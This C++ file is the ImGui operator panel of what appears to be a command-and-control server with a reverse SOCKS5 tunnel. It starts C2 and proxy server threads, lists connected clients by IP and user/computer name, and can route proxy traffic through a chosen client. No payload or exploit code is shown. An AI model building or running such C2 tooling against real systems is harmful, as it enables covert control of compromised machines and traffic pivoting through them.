
#include <thread>
#include <string>
#include <imgui.h>
#include <GLFW/glfw3.h>
#include "ConfigIni.h"
#include "Texture.h"
#include "Font/roboto-regular.h"
#include "../GUI_backend.h"
#include "Application.h"
#include "Sock5/Sock5RServer.h"

namespace Application {

	WORD C2Port, TunnelPort, Sock5Port;
	bool ServerThreadTerminated = false;
	bool C2ServerThreadTerminated = false;
	int ServerStatus;
	SOCKET Sock5Sock, TunnelSock, C2Sock, CurrentProxy;
	std::string DefaultFile;
	static bool SettingsWindowClosed = false;
	static std::thread MainServerThread;
	static std::thread C2ServerThread;

	const ImGuiTableSortSpecs* ClientItem::s_current_sort_specs = nullptr;

	ImVector<ClientItem> Clients;
	static bool items_need_sort = false;

	void SetStyle(bool alt = true) {

		ImGuiStyle& style = ImGui::GetStyle();
		ImVec4* colors = ImGui::GetStyle().Colors;

		style.ChildRounding = 3.f;
		style.GrabRounding = 0.f;
		style.WindowRounding = 0.f;
		style.ScrollbarRounding = 3.f;
		style.FrameRounding = 3.f;
		style.WindowTitleAlign = ImVec2(0.5f, 0.5f);

		auto ImVec4 = [&alt](float r, float g, float b, float a) {
			float h, s, v;
			ImGui::ColorConvertRGBtoHSV(r, g, b, h, s, v);
			if (alt && (s < 0.1f))
				v = 1 - v;
			ImGui::ColorConvertHSVtoRGB(h, s, v, r, g, b);
			return ImColor(r, g, b, a);
		};

		colors[ImGuiCol_Text] = ImVec4(0.73f, 0.73f, 0.73f, 1.00f);
		colors[ImGuiCol_TextDisabled] = ImVec4(0.50f, 0.50f, 0.50f, 1.00f);
		colors[ImGuiCol_WindowBg] = ImVec4(0.26f, 0.26f, 0.26f, 0.95f);
		colors[ImGuiCol_ChildBg] = ImVec4(0.28f, 0.28f, 0.28f, 1.00f);
		colors[ImGuiCol_PopupBg] = ImVec4(0.32f, 0.32f, 0.32f, 1.00f);
		colors[ImGuiCol_Border] = ImVec4(0.42f, 0.42f, 0.42f, 1.00f);
		colors[ImGuiCol_BorderShadow] = ImVec4(0.26f, 0.26f, 0.26f, 1.00f);
		colors[ImGuiCol_FrameBg] = ImVec4(0.16f, 0.16f, 0.16f, 1.00f);
		colors[ImGuiCol_FrameBgHovered] = ImVec4(0.16f, 0.16f, 0.16f, 1.00f);
		colors[ImGuiCol_FrameBgActive] = ImVec4(0.16f, 0.16f, 0.16f, 1.00f);
		colors[ImGuiCol_TitleBg] = ImVec4(0.36f, 0.36f, 0.36f, 1.00f);
		colors[ImGuiCol_TitleBgActive] = ImVec4(0.36f, 0.36f, 0.36f, 1.00f);
		colors[ImGuiCol_TitleBgCollapsed] = ImVec4(0.36f, 0.36f, 0.36f, 1.00f);
		colors[ImGuiCol_MenuBarBg] = ImVec4(0.26f, 0.26f, 0.26f, 1.00f);
		colors[ImGuiCol_ScrollbarBg] = ImVec4(0.21f, 0.21f, 0.21f, 1.00f);
		colors[ImGuiCol_ScrollbarGrab] = ImVec4(0.36f, 0.36f, 0.36f, 1.00f);
		colors[ImGuiCol_ScrollbarGrabHovered] = ImVec4(0.36f, 0.36f, 0.36f, 1.00f);
		colors[ImGuiCol_ScrollbarGrabActive] = ImVec4(0.36f, 0.36f, 0.36f, 1.00f);
		colors[ImGuiCol_CheckMark] = ImVec4(0.78f, 0.78f, 0.78f, 1.00f);
		colors[ImGuiCol_SliderGrab] = ImVec4(0.74f, 0.74f, 0.74f, 1.00f);
		colors[ImGuiCol_SliderGrabActive] = ImVec4(0.74f, 0.74f, 0.74f, 1.00f);
		colors[ImGuiCol_Button] = ImVec4(0.36f, 0.36f, 0.36f, 1.00f);
		colors[ImGuiCol_ButtonHovered] = ImVec4(0.43f, 0.43f, 0.43f, 1.00f);
		colors[ImGuiCol_ButtonActive] = ImVec4(0.11f, 0.11f, 0.11f, 1.00f);
		colors[ImGuiCol_Header] = ImVec4(0.36f, 0.36f, 0.36f, 1.00f);
		colors[ImGuiCol_HeaderHovered] = ImVec4(0.36f, 0.36f, 0.36f, 1.00f);
		colors[ImGuiCol_HeaderActive] = ImVec4(0.36f, 0.36f, 0.36f, 1.00f);
		colors[ImGuiCol_Separator] = ImVec4(0.39f, 0.39f, 0.39f, 1.00f);
		colors[ImGuiCol_SeparatorHovered] = ImVec4(0.68f, 0.68f, 0.68f, 0.68f);
		colors[ImGuiCol_SeparatorActive] = ImVec4(0.68f, 0.68f, 0.68f, 1.00f);
		colors[ImGuiCol_ResizeGrip] = ImVec4(0.55f, 0.55f, 0.55f, 1.00f);
		colors[ImGuiCol_ResizeGripHovered] = ImVec4(0.56f, 0.56f, 0.56f, 0.61f);
		colors[ImGuiCol_ResizeGripActive] = ImVec4(0.61f, 0.61f, 0.61f, 0.66f);
		colors[ImGuiCol_Tab] = ImVec4(0.52f, 0.52f, 0.52f, 0.18f);
		colors[ImGuiCol_TabHovered] = ImVec4(0.59f, 0.59f, 0.59f, 0.54f);
		colors[ImGuiCol_TabActive] = ImVec4(0.26f, 0.26f, 0.26f, 0.95f);
		colors[ImGuiCol_TabUnfocused] = ImVec4(0.26f, 0.26f, 0.26f, 0.97f);
		colors[ImGuiCol_TabUnfocusedActive] = ImVec4(0.18f, 0.18f, 0.18f, 0.95f);
		colors[ImGuiCol_PlotLines] = ImVec4(0.39f, 0.39f, 0.39f, 1.00f);
		colors[ImGuiCol_PlotLinesHovered] = ImVec4(0.03f, 0.69f, 0.74f, 1.00f);
		colors[ImGuiCol_PlotHistogram] = ImVec4(0.00f, 0.44f, 0.42f, 1.00f);
		colors[ImGuiCol_PlotHistogramHovered] = ImVec4(0.00f, 0.44f, 0.42f, 0.74f);
		colors[ImGuiCol_TableHeaderBg] = ImVec4(0.23f, 0.23f, 0.23f, 1.00f);
		colors[ImGuiCol_TableBorderStrong] = ImVec4(0.31f, 0.31f, 0.35f, 1.00f);
		colors[ImGuiCol_TableBorderLight] = ImVec4(0.35f, 0.35f, 0.35f, 1.00f);
		colors[ImGuiCol_TableRowBg] = ImVec4(0.00f, 0.00f, 0.00f, 0.00f);
		colors[ImGuiCol_TableRowBgAlt] = ImVec4(1.00f, 1.00f, 1.00f, 0.06f);
		colors[ImGuiCol_TextSelectedBg] = ImVec4(0.21f, 0.47f, 0.64f, 1.00f);
		colors[ImGuiCol_DragDropTarget] = ImVec4(1.00f, 1.00f, 0.00f, 0.90f);
		colors[ImGuiCol_NavHighlight] = ImVec4(0.82f, 0.82f, 0.82f, 1.00f);
		colors[ImGuiCol_NavWindowingHighlight] = ImVec4(1.00f, 1.00f, 1.00f, 0.70f);
		colors[ImGuiCol_NavWindowingDimBg] = ImVec4(0.80f, 0.80f, 0.80f, 0.20f);
		colors[ImGuiCol_ModalWindowDimBg] = ImVec4(0.20f, 0.20f, 0.20f, 0.50f);

#ifdef IMGUI_HAS_DOCK
		style.TabBorderSize = 0;
		style.TabRounding = 3;

		colors[ImGuiCol_DockingPreview] = ImVec4(0.77f, 0.77f, 0.77f, 0.70f);
		colors[ImGuiCol_DockingEmptyBg] = ImVec4(0.20f, 0.20f, 0.20f, 1.00f);

		if (ImGui::GetIO().ConfigFlags & ImGuiConfigFlags_ViewportsEnable) {
			style.WindowRounding = 0.0f;
			style.Colors[ImGuiCol_WindowBg].w = 1.0f;
		}
#endif
	}

	void LoadDefaultFont(ImGuiIO& io) {
		// Load default font
		ImFontConfig fontConfig;
		fontConfig.FontDataOwnedByAtlas = false;
		ImFont* robotoFont = io.Fonts->AddFontFromMemoryTTF((void*)g_RobotoRegular, sizeof(g_RobotoRegular), 25.0f, &fontConfig);
		assert(robotoFont != nullptr);
		io.FontDefault = robotoFont;
	}

	void InitGuiStyle(ImGuiIO& io) {
		SetStyle(false);
		LoadDefaultFont(io);
	}

	void Init(ImGuiIO& io) {
		ServerThreadTerminated = false;

		WSADATA WsaData = {};
		if (WSAStartup(MAKEWORD(2, 2), &WsaData) != 0) {
			MessageBoxA(nullptr, "Can't Init Windows Sock", "Error", MB_OK | MB_ICONERROR);
			ExitProcess(0);
		}

		if (int S5Port = ConfigIni::GetInt("Server", "SOCK5Port", 9090)) {
			Sock5Port = S5Port;
		}
		if (int TPort = ConfigIni::GetInt("Server", "TunnelPort", 5050)) {
			TunnelPort = TPort;
		}
		if (int CPort = ConfigIni::GetInt("Server", "C2Port", 7070)) {
			C2Port = CPort;
		}

		CurrentProxy = 0;

		MainServerThread = StartC2Server(); // Init the C2 Server Thread.
		MainServerThread.detach();
		C2ServerThread = InitNewServer();  // Init the Sock5 & Tunnel Servers Thread.
		C2ServerThread.detach();

		InitGuiStyle(io);
		io.ConfigWindowsMoveFromTitleBarOnly = false;
	}

	void MainMenuRender() {

		if (ImGui::BeginMainMenuBar()) {

			if (ImGui::BeginMenu("File")) {
				if (ImGui::MenuItem("Quit", nullptr)) {
					CloseApplication();
				}

				ImGui::EndMenu();
			}

			if (ImGui::BeginMenu("Options")) {
				if (ImGui::MenuItem("Settings")) {
					SettingsWindowClosed = true;
				}
				ImGui::Separator();
				if (ImGui::MenuItem("Invert Style Colors")) {
					static bool StyleColor = false;
					StyleColor = !StyleColor;
					SetStyle(StyleColor);
				}
				ImGui::EndMenu();
			}
			ImGui::EndMainMenuBar();
		}
	}

	void ConnectionTableRender() {

		static ImGuiTableFlags TableFlags =
			ImGuiTableFlags_Resizable | ImGuiTableFlags_SizingStretchSame | ImGuiTableFlags_Reorderable | ImGuiTableFlags_Hideable
				| ImGuiTableFlags_Sortable | ImGuiTableFlags_SortMulti | ImGuiTableFlags_RowBg | ImGuiTableFlags_Borders | ImGuiTableFlags_ScrollX
				| ImGuiTableFlags_ScrollY;

		const float TEXT_BASE_HEIGHT = ImGui::GetTextLineHeightWithSpacing();
		static ImVec2 outer_size_value = ImVec2(0.0f, TEXT_BASE_HEIGHT * 12);

		static int freeze_cols = 1;
		static int freeze_rows = 1;
		static float row_min_height = 0.0f; // Auto

		// Submit table
		if (ImGui::BeginTable("clients_table", 4, TableFlags)) {
			// Declare columns
			// We use the "user_id" parameter of TableSetupColumn() to specify a user id that will be stored in the sort specifications.
			// This is so our sort function can identify a column given our own identifier. We could also identify them based on their index!
			ImGui::TableSetupColumn("Sock",
				ImGuiTableColumnFlags_DefaultSort | ImGuiTableColumnFlags_WidthFixed | ImGuiTableColumnFlags_NoHide,
				0.0f,
				ClientItemColumnID_ID);
			ImGui::TableSetupColumn("Host / IP", ImGuiTableColumnFlags_WidthStretch, 0.0f, ClientItemColumnID_IP);
			ImGui::TableSetupColumn("User / Computer", ImGuiTableColumnFlags_WidthStretch, 0.0f, ClientItemColumnID_Name);
			ImGui::TableSetupColumn("Active Sock5",
				ImGuiTableColumnFlags_NoSort | ImGuiTableColumnFlags_NoHide | ImGuiTableColumnFlags_WidthStretch,
				0.0f,
				ClientItemColumnID_ActiveSock);
			ImGui::TableSetupScrollFreeze(freeze_cols, freeze_rows);

			// Sort our data if sort specs have been changed!
			ImGuiTableSortSpecs* sorts_specs = ImGui::TableGetSortSpecs();
			if (sorts_specs && sorts_specs->SpecsDirty)
				items_need_sort = true;
			if (sorts_specs && items_need_sort && Clients.Size > 1) {
				ClientItem::s_current_sort_specs = sorts_specs; // Store in variable accessible by the sort function.
				qsort(&Clients[0], (size_t)Clients.Size, sizeof(Clients[0]), ClientItem::CompareWithSortSpecs);
				ClientItem::s_current_sort_specs = nullptr;
				sorts_specs->SpecsDirty = false;
			}
			items_need_sort = false;

			// headers
			ImGui::TableHeadersRow();

			// Show data
			ImGui::PushButtonRepeat(true);
			// Demonstrate using clipper for large vertical lists
			ImGuiListClipper clipper;
			clipper.Begin(Clients.Size);
			while (clipper.Step()) {
				for (int row_n = clipper.DisplayStart; row_n < clipper.DisplayEnd; row_n++) {
					ClientItem* item = &Clients[row_n];

					ImGui::PushID((int)item->Sock);
					ImGui::TableNextRow(ImGuiTableRowFlags_None, row_min_height);

					// For the demo purpose we can select among different type of Clients submitted in the first column
					ImGui::TableSetColumnIndex(0);
					char label[32];
					sprintf(label, "%04llu", item->Sock);

					ImGui::SetNextItemWidth(-FLT_MIN);
					ImGui::TextUnformatted(label);

					if (ImGui::TableSetColumnIndex(1))
						ImGui::TextUnformatted(item->IP.c_str());

					// Here we demonstrate marking our data set as needing to be sorted again if we modified a quantity,
					// and we are currently sorting on the column showing the Quantity.
					// To avoid triggering a sort while holding the button, we only trigger it when the button has been released.
					// You will probably need a more advanced system in your code if you want to automatically sort when a specific entry changes.
					if (ImGui::TableSetColumnIndex(2)) {
						ImGui::SetNextItemWidth(-FLT_MIN);
						ImGui::TextUnformatted(item->Name.c_str());
					}
					if (ImGui::TableSetColumnIndex(3)) {
						ImGui::SetNextItemWidth(-FLT_MIN);
						if (ImGui::SmallButton(Application::CurrentProxy != item->Sock ? "Enable" : "Disable")) {
							if (Application::CurrentProxy == item->Sock)
								Application::CurrentProxy = 0;
							else
								Application::CurrentProxy = item->Sock;
						}
					}

					if (Application::CurrentProxy == item->Sock) {
						ImU32 row_bg_color = ImGui::GetColorU32(ImVec4(0.24f, 0.40f, 0.10f, 0.78f));
						ImGui::TableSetBgColor(ImGuiTableBgTarget_RowBg0, row_bg_color);
					}

					ImGui::PopID();
				}
			}
			ImGui::PopButtonRepeat();
			ImGui::EndTable();
		}

	}

	void UIRender() {
#ifdef IMGUI_HAS_DOCK
		ImGui::DockSpaceOverViewport(ImGui::GetMainViewport());
#endif
		// Main Window
		if (ImGui::Begin("SOCK5", nullptr, ImGuiWindowFlags_AlwaysAutoResize | ImGuiWindowFlags_MenuBar | ImGuiWindowFlags_NoTitleBar)) {

			MainMenuRender();

			if (SettingsWindowClosed) {
				if (ImGui::Begin("Settings", &SettingsWindowClosed)) {
					static int C2P = Application::C2Port;
					ImGui::InputInt("C2 Port", &C2P);
					static int TP = Application::TunnelPort;
					ImGui::InputInt("Tunnel Port", &TP);
					static int Sock5P = Application::Sock5Port;
					ImGui::InputInt("Sock5 Port", &Sock5P);
					if (ImGui::Button("Save")) {
						ConfigIni::SetInt("Server", "C2Port", C2P);
						ConfigIni::SetInt("Server", "TunnelPort", TP);
						ConfigIni::SetInt("Server", "SOCK5Port", Sock5P);
					}
					ImGui::End();
				}
			}

			// Render Clients Table
			ConnectionTableRender();

			ImGui::End(); // Main Window
		}
	}

	void PreDestroy() {
		CloseApplication();
	}

	void Destroy() {

	}
}